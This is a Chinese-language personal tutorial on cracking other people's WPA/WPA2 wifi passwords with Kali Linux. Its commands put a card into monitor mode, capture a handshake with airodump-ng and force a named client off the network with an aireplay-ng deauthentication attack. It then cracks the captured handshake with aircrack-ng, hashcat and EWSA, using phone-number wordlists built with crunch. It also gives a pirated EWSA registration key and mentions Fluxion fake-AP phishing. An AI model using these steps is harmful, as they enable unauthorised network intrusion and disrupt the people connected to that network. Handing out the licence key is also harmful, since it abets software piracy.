# 破解wifi密码

## Aircrack-ng 工具

Aircrack-ng是一个与802.11标准的无线网络分析有关的安全软件，主要功能有：网络侦测，数据包嗅探，WEP和WPA/WPA2-PSK破解。

### 网上教程

[教程链接](https://tieba.baidu.com/p/7981575504)
[教程链接2](https://www.jianshu.com/p/2ec8b2ef84ae)
[教程链接3](https://blog.csdn.net/Pythonicc/article/details/105029705)
[教程链接4](https://www.aneasystone.com/archives/2016/08/wireless-analysis-one-monitoring.html)

我按网上的教程，在扫描WiFi时，扫描不到，经多次尝试，按我下面的步骤可以成功

### 前置条件

一个kali支持的无线网卡，芯片3070/8187/5370都可以
注意，因为kali是安装在虚拟机里的，不能直接调用宿主机自带的ax200无线网卡，但是可以调用USB无线网卡，这里我使用的是RT3070L芯片的网卡

### step0：关掉干扰进程

```shell
su root
# 关掉干扰进程，执行之后会整个系统断网，不要惊慌
airmon-ng check kill
```

### step1：启用网卡的监听模式

在usb2.0接口插上RT3070L无线网卡
在虚拟机中启用这个USB设备
![](resources/2023-07-02-19-37-23.png)
网卡我用风扇散热，过热的话抓不到数据

```shell
# 用这个命令应该能看到wlan0网卡
ifconfig -a
# 如果用这个命令也能看到wlan0网卡，说明这个网卡被启用
ifconfig
# 如果wlan0网卡已启用，就禁用这个网卡
ifconfig wlan0 down
# 这时用这个命令应该看不到wlan0网卡
ifconfig
# 看到wlan0网卡的模式为Managed
iwconfig
# 将wlan0网卡的模式改为Monitor
iwconfig wlan0 mode monitor
# 再启用wlan0网卡
ifconfig wlan0 up
# 如果能看到wlan0网卡，说明这个网卡被启用
ifconfig
# 开启监听
airmon-ng start wlan0
# 这时候应该不会提示执行 airmon-ng check kill
```

![](resources/2023-07-04-13-12-21.png)
![](resources/2023-07-02-19-42-28.png)

查看自己的网卡是什么芯片可以使用
```shell
lsusb
dmesg -T
```

![](resources/2023-07-02-19-58-03.png)

### step2：扫描WiFi

在root目录下创建wifi_crack文件夹（用于保存抓到的握手包），并进入
![](resources/2023-07-02-20-30-20.png)

```shell
# 探测所有无线网络，抓取数据包
airodump-ng wlan0mon
```

有时候扫描不到WiFi，那就在虚拟机设置中拔出再插入USB网线网卡，然后从step1开始执行

![](resources/2023-07-03-17-26-08.png)

字段解释：
- BSSID：表示无线 AP 的 MAC 地址
- PWR：信号强度，它的值一般都是一个负数，值越大，表示信号越强。如果 PWR 值为 -1，说明不支持信号强度的查看
- Beacons：Beacon 是无线数据包中最有用的一种，叫做信号数据包。802.11 的数据包按类型可以分成三类：管理、控制和数据。管理类数据包又可以分为三种子类型：认证（authentication）、关联（association）和信号（beacon）数据包。Beacon 由 WAP 发送，穿过无线信道通知所有无线客户端存在这个 WAP，并定义了连接它必须设置的一些参数
- #Data：捕获到的数据分组的数量，包括广播分组
- CH：信道号
- MB：WAP 所支持的最大速率
- ENC：使用的加密算法体系。OPN 表示无加密，WEP? 表示 WEP 或者 WPA/WPA2，WEP 表示静态的或者动态的 WEP，当然，WEP 加密很早就已经遭淘汰了，目前最常见的是 WPA 和 WPA2
- CIPHER：使用的加密算法。常见的算法有：CCMP、WRAAP、TKIP、WEP 等
- AUTH：使用的认证协议。常用的有：MGT（WPA/WPA2 使用独立的认证服务器，譬如 802.1x、RADIUS、EAP 等），SKA（WEP 的共享密钥），PSK（WPA/WPA2 的预共享密钥）和 OPN（开放式）
- ESSID：所谓的 SSID 号，如果启用隐藏的话，ESSID 可以为空，或者显示为 <length: 0>
- STATION：客户端的 Mac 地址，包括连上的和想要连的客户端。如果客户端没有连上 AP，ESSID 列显示成 (not associated)
- Probe：被客户端查探的 ESSID，如果客户端正在试图连接一个 AP，但是没有连接上，将会显示在这里

### step3：攻击并抓取握手包

通过抓去这个指定bssid我已经看到有一个用户连接，STATION可以看到
接下来进行握手包抓取了
```shell
# 探测指定的无线网络
# 参数：
# -c 指定频道号
# --bssid 指定路由器bssid
# -w 指定抓取的握手包存储路径
# 最后是指定网卡接口
airodump-ng wlan0 -c 1 --bssid 94:0C:6D:46:51:52 -w ./
```

![](resources/2023-07-03-17-29-06.png)

到现在为止，我只有一个终端窗口
请勿多开终端窗口，不然可能导致一直抓不到信息

对其中的一个连接进行攻击，使其对AP断开连接
注意：此时我上面一个终端窗口并没有停止抓包，而是一只运行着，我下面是新开的一个终端，现在一共打开两个终端窗口

aireplay-ng是一个注入帧的工具
接下来进行
```shell
# 对指定BSSID的目标网络发送解除认证数据包，迫使客户端重新认证并捕获握手数据包
# 参数：
# -0 表示解除认证攻击，后接的数字是攻击次数
# -a 指定无线路由器BSSID
# -c 指定强制断开的设备
# 最后是指定网卡接口
aireplay-ng -0 10 -a 94:0C:6D:46:51:52 -c 8A:07:74:A1:D2:D9 wlan0
```

[Aircrack-ng之Aireplay-ng命令详解](https://blog.csdn.net/qq_28208251/article/details/48115815)

根据无线网络路由器的MAC地址和连接无线网络的设备的MAC地址对指定目标发起deauth反认证包攻击，让那个设备断开wifi，随后它自然会再次连接wifi，当它自动重新连接wifi的时候，我们的攻击终端便能抓到握手包

![](resources/2023-07-03-17-30-09.png)

第一个终端右上角提示拿到了握手包，握手包保存到了当前目录下的cap格式文件

![](resources/2023-07-03-17-30-57.png)

### step4：破解密码

#### 使用aircrack-ng

现在需要字典

[利用kali生成字典的三种方式](https://blog.csdn.net/qq_44204058/article/details/115562895)

kali自带字典的目录为
```
/usr/share/wordlists/
```

对刚才抓取到的握手包进行密码破解
```shell
# 跑字典
# 参数：
# -w 指定字典
# 最后是指定保存了握手包的cap格式文件
aircrack-ng -w ./pass_test.txt ./-18.cap
```

![](resources/2023-07-03-18-29-38.png)

这里为了测试，我把已知正确的密码加到了字典文件中
破解成功

#### 使用Hashcat

##### 生成字典

用中国大陆手机号字典

[生成全部中国大陆手机号字典](https://blog.zhouqian.wang/index.php/2023/03/13/crunch-hashcat-%e7%a4%be%e5%b7%a5%e5%af%86%e7%a0%81%e7%bb%84%e5%90%8811%e4%bd%8d%e6%89%8b%e6%9c%ba%e5%8f%b7-%e5%a7%93%e5%90%8d%e7%94%9f%e6%97%a5%e7%bc%a9%e5%86%99%ef%bc%8c%e9%81%bf%e5%85%8d/)

用两本字典来组合

![](resources/2023-07-03-18-58-01.png)

[使用crunch创建密码字典](https://www.cnblogs.com/itwangqiang/p/14878789.html)

```shell
crunch 9 9 -t %%%%%%%%% -o mobilephone_tail.txt 
```

![](resources/2023-07-03-19-08-33.png)

![](resources/2023-07-03-19-20-20.png)

##### 握手包格式转换（cap to hc22000）

现在很多关于hashcat的博客关于转换的描述都说是cap转换为hccap格式，但是这种格式其实已经不适用于现在的hashcat版本了，在hashcat6.0版本之后，-m 2500 和 -m 16800 已经被更改为 -m 22000 了

首先要把airodump抓取的cap文件转化为hc22000格式

[在线转换网站](https://hashcat.net/cap2hashcat/)

##### 破解

[Hashcat详解](https://www.sqlsec.com/2019/10/hashcat.html)
[Hashcat使用](https://blog.csdn.net/m0_50177728/article/details/124003791)
[Hashcat使用2](https://www.cnblogs.com/diligenceday/p/6359661.html)

使用hashcat组合破解模式

```shell
# 跑字典
# 参数：
# -a 指定攻击模式，1 代表组合破解
# -m 指定破解模式，22000 代表握手包破解模式
# -o 表示结果输出路径
# 最后是指定字典文件，组合破解时，注意字典的顺序
hashcat -a 1 -m 22000 ./1880_1688381391.hc22000 -o wifi_passwd_result.txt mobilephone_head.txt mobilephone_tail.txt
```

![](resources/2023-07-03-19-27-32.png)

这个就是运行中的结果，在运行过程中可以向终端输入命令s来查看实时破解状态

这里在kali虚拟机中的破解速度很慢，那就用windows宿主机破解（EWSA软件）

#### EWSA跑包

在windows系统中安装EWSA（Elcomsoft Wireless Security Auditor）

[EWSA软件下载网址](https://www.jb51.net/softs/359426.html)

下载后解压并安装

可用的注册码
```
EWSA-173-HC1UW-L3EGT-FFJ3O-SOQB3
```

导入cap格式的文件
![](resources/2023-07-04-02-18-15.png)

![](resources/2023-07-04-02-18-39.png)

使用掩码破解

我们点一下“添加”按钮，输入3456789，确定。

然后修改一下掩码，在8个?d前面加上1?1?d，点击应用、确定。这里第一个1没别的意思，就是1的意思，我们的手机号都是1开头的，?1里面的1是我们刚刚添加的一个定义，默认分到的序号是1，我们手机号的第二位都是3456789，没有其他数字，?d是为了凑齐十一位数。
点击开始破解，掩码攻击，就开始破解以手机号为密码的WiFi密码了。

![](resources/2023-07-04-02-22-14.png)

开始掩码攻击

![](resources/2023-07-04-02-21-42.png)

![](resources/2023-07-04-02-25-23.png)

发现核显的电脑比独显的电脑慢很多，换用独显电脑

![](resources/2023-07-04-02-52-27.png)

破解成功

## Fluxion 工具

钓鱼wifi的框架工具
就是做伪AP，很经典的欺骗方式
















---


虚拟机安装kali，里面有各种破解软件，相关教程也可以到网上找到，比如Aircrack-ng，使用单独网卡可以搞定；如果是使用Fluxion 等社会工程方式破解，则需要两种不同的网卡，即RT3070和螃蟹卡8187各买一张。


网卡找字典，做好长跑还未必跑的出来的准备。一般来说，字典越大，破解的几率越大，但耗时也越长。速度比较快的破解方式是hash码表，8位密码秒破，但现在的密码很少有8位的，并且生成hash码表比较耗时，更让人**的是一个essid只对应一个hash码表，也就是每个wifi信号都需要重新生成一次……。如果你运气比较好，对方有开放pin那最好了，最多半小时搞定。


